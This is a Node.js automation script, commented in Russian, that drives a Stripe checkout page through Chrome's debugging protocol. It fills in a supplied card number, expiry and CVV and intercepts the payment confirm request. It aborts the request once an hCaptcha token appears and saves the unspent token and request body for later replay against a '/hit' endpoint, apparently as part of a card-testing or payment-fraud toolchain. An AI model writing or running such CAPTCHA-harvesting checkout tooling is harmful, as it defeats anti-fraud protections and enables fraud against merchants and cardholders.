// language: JavaScript (Node, .cjs), file: tools/hcaptcha_capture.cjs, target: Windows + Chrome по CDP
// РОЛЬ: ЗАМЕР. Снять СВЕЖИЙ hCaptcha-токен страницы, не потратив попытку.
//
// Механика: страница выпускает passive_captcha_token в момент отправки формы. Мы перехватываем
// POST .../confirm на уровне CDP (Fetch.requestPaused), забираем тело и ГАСИМ запрос (failRequest) —
// сервер его не видит, попытка не тратится, сессия не портится. Тело уходит в data/confirm_capture.json,
// оттуда page_bundle.py соберёт набор для /hit.
// Запуск: node tools/hcaptcha_capture.cjs <card|PAN|MM|YY|CVV> [cdp]
const fs = require("fs");
const path = require("path");
const CARD = process.argv[2] || "";
const CDP = process.argv[3] || "http://127.0.0.1:9224";

function resolvePlaywright() {
  const c = [];
  if (process.env.PLAYWRIGHT_CORE) c.push(process.env.PLAYWRIGHT_CORE);
  c.push("playwright-core");
  try {
    const npx = path.join(process.env.LOCALAPPDATA || "", "npm-cache", "_npx");
    for (const d of fs.readdirSync(npx)) { const p = path.join(npx, d, "node_modules", "playwright-core"); if (fs.existsSync(p)) c.push(p); }
  } catch (e) {}
  for (const x of c) { try { return require(x); } catch (e) {} }
  throw new Error("playwright-core не найден");
}
const mask = (k) => String(k).slice(0, 12);

(async () => {
  if (!CARD.includes("|")) { console.log("нужна карта: PAN|MM|YY|CVV"); process.exit(1); }
  const [pan, mm, yy, cvv] = CARD.split("|");
  const pw = resolvePlaywright();
  const browser = await pw.chromium.connectOverCDP(CDP);
  const ctx = browser.contexts()[0];
  const page = ctx.pages().find((p) => String(p.url()).includes("checkout.stripe.com")) || ctx.pages()[0];
  console.log("PAGE " + String(page.url()).split("#")[0].slice(0, 96));

  if (process.argv.includes("--reload")) {
    console.log("перезагружаю страницу (после прошлого прогона мог остаться error-state)");
    await page.reload({ waitUntil: "domcontentloaded" }).catch(() => {});
    await page.waitForTimeout(4000);
  }
  let cdp, captured = null;
  cdp = await ctx.newCDPSession(page);
  // Логика перехвата: confirm БЕЗ passive_captcha_token пропускаем — именно он заставляет страницу
  // запустить виджет hCaptcha и выпустить токен. Второй confirm С токеном гасим и забираем себе:
  // сервер его не видит, значит токен не потрачен и остаётся нашим.
  let n = 0;
  cdp.on("Fetch.requestPaused", async (ev) => {
    const url = String(ev.request.url);
    try {
      if (/\/confirm(\?|$)/.test(url) && ev.request.method === "POST") {
        n += 1;
        const body = String(ev.request.postData || "");
        const p = new URLSearchParams(body);
        const t = p.get("passive_captcha_token") || "";
        console.log("confirm #" + n + ": passive token prefix=" + (t.slice(0, 6) || "-") + " len=" + t.length +
                    " js_checksum=" + (p.get("js_checksum") || "").length +
                    " px3=" + (p.get("px3") || "").length + " amount=" + (p.get("expected_amount") || "-") +
                    (t ? " -> ГАШУ и забираю" : " -> пропускаю (пусть страница получит челлендж)"));
        if (t) {
          if (!captured) { captured = { at: new Date().toISOString(), url, body, headers: ev.request.headers }; }
          await cdp.send("Fetch.failRequest", { requestId: ev.requestId, errorReason: "Aborted" }).catch(() => {});
          return;
        }
        await cdp.send("Fetch.continueRequest", { requestId: ev.requestId }).catch(() => {});
        return;
      }
      await cdp.send("Fetch.continueRequest", { requestId: ev.requestId }).catch(() => {});
    } catch (e) {}
  });
  await cdp.send("Fetch.enable", { patterns: [{ urlPattern: "*confirm*", requestStage: "Request" }] });
  console.log("перехват confirm включён (запрос будет погашен, не отправлен)");

  const frameFor = async (id) => {
    for (const f of page.frames()) {
      try { if (await f.locator("#" + id).first().count()) return f; } catch (e) {}
    }
    return null;
  };
  const setTxt = async (id, v) => {
    const f = await frameFor(id);
    if (!f) { console.log("нет поля " + id); return false; }
    try { await f.locator("#" + id).first().fill(v, { timeout: 6000 }); await page.waitForTimeout(120); return true; }
    catch (e) { console.log("fill " + id + " ошибка: " + String(e.message).split("\n")[0].slice(0, 80)); return false; }
  };
  await setTxt("cardNumber", pan.replace(/(.{4})/g, "$1 ").trim());
  await setTxt("cardExpiry", mm + " / " + yy);
  await setTxt("cardCvc", cvv);
  await setTxt("billingName", "John Smith");
  await setTxt("billingPostalCode", "10001");
  const post = await frameFor("billingPostalCode");
  if (post) await post.locator("#billingPostalCode").first().press("Escape").catch(() => {});
  await page.waitForTimeout(400);

  let btn = null, label = "";
  for (const f of page.frames()) {
    for (const lb of ["Оплатить и подписаться", "Подписаться", "Оплатить картой"]) {
      try {
        const c = f.locator("button:has-text(\"" + lb + "\")");
        const n = await c.count();
        for (let i = 0; i < n && !btn; i++) {
          const el = c.nth(i);
          if (!(await el.isVisible())) continue;
          const t = ((await el.innerText()) || "").replace(/\s+/g, " ").trim();
          if (/подписаться|оплатить/i.test(t)) { btn = el; label = t.slice(0, 40); }
        }
      } catch (e) {}
      if (btn) break;
    }
    if (btn) break;
  }
  if (!btn) { console.log("кнопка оплаты не найдена"); process.exit(4); }
  console.log("кнопка: \"" + label + "\" — жму (запрос будет погашен)");
  await btn.click({ timeout: 8000 }).catch((e) => console.log("клик: " + String(e.message).split("\n")[0].slice(0, 90)));

  const t0 = Date.now();
  while (!captured && Date.now() - t0 < 60000) await page.waitForTimeout(500);
  await cdp.send("Fetch.disable").catch(() => {});

  if (!captured) { console.log("ИТОГ: confirm не перехвачен за 45 с (форма не отправилась?)"); process.exit(3); }
  fs.writeFileSync(path.join("data", "confirm_capture.json"), JSON.stringify(captured, null, 1), "utf8");
  const p = new URLSearchParams(captured.body);
  const out = {};
  for (const [k, v] of p.entries()) out[k] = k === "passive_captcha_token" ? mask(v) + "…(" + v.length + ")" : v;
  console.log("ИТОГ тело confirm: " + JSON.stringify(out).slice(0, 900));
  console.log("записан data/confirm_capture.json (тело целиком)");
  process.exit(0);
})().catch((e) => { console.log("ERR " + String(e.message).split("\n")[0]); process.exit(1); });
